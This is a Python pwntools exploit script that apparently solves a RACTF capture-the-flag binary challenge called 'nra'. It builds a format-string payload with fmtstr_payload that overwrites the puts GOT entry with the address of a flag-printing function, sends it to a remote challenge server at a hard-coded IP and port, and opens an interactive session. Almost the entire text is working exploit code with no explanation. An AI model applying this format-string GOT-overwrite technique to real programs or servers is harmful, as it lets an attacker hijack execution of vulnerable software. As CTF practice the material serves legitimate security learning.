#!/usr/bin/env python

from pwn import *

exe = ELF("./nra")
libc = ELF("./libc-2.27.so")

context.binary = exe


def conn():
        return process([exe.path], env={"LD_PRELOAD": libc.path})


def main():
#    r = conn()
    r = remote("95.216.233.106",41156)
    system = 0x0804c01c
    main = 0x08049270
    puts = 0x0804c018
    printf = 0x0804c00c
    flaggy = 0x08049245

    write = {puts:flaggy}
    payload = fmtstr_payload(4, write)

    r.recvuntil("How are you finding RACTF?\n")

    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
